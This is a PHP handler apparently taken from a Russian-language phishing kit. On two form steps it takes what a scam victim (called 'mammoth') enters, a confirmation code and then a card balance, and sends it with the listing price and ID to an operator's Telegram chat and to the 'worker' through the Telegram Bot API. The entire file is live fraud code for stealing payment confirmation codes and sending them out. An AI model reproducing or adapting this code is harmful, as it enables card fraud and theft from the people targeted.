<?php
include "config.php";

if(isset($_POST)){

    switch ($_POST['step']){

            case 2:
            $link = Links::find(['order_id'=>$_POST['order_id']]);

            $message = ($link->type?  '❗ '.$link->platform.' 1.0 ❗' :'❗ '.$link->platform.' 2.0 ❗').'  \n 
⚠️Мамонт ввел код:
💸код: '.$_POST['code']."
🧲Цена: " . $link->price . " руб
⚔ID Обьявления: " . $link->order_id . "
💣Воркер: ".$link->worker;
            $filename = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $operator_chat_id . '&text=' . urlencode($message) . '&parse_mode=html';
            file_get_contents($filename);
                $message = ($link->type?  '❗ '.$link->platform.' 1.0 ❗' :'❗ '.$link->platform.' 2.0 ❗')."  \n 
⚠️Мамонт ввел код:
🧲Цена: " . $link->price . " руб
⚔ID Обьявления: " . $link->order_id . "
💣Воркер: ".$link->worker;
                $filename = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' .  $link->worker_id . '&text=' . urlencode($message) . '&parse_mode=html';
                file_get_contents($filename);
            break;

        case 3:
            $link = Links::find(['order_id'=>$_POST['order_id']]);

            $message = ($link->type?  '❗ '.$link->platform.' 1.0 ❗' :'❗ '.$link->platform.' 2.0 ❗')."
⚠️Мамонт ввел баланс:
🕯Баланс: ".$_POST['code']." 
🧲Цена: " . $link->price . " руб
⚔ID Обьявления: " . $link->order_id . "
💣Воркер: ".$link->worker;
            $filename = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $operator_chat_id . '&text=' . urlencode($message) . '&parse_mode=html';
            file_get_contents($filename);
            $message = ($link->type?  '❗ '.$link->platform.' 1.0 ❗' :'❗ '.$link->platform.' 2.0 ❗')."
⚠️Мамонт ввел баланс:
🧲Цена: " . $link->price . " руб
⚔ID Обьявления: " . $link->order_id . "
💣Воркер: ".$link->worker;
            $filename = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' .  $link->worker_id . '&text=' . urlencode($message) . '&parse_mode=html';
            file_get_contents($filename);
            break;


    }
}
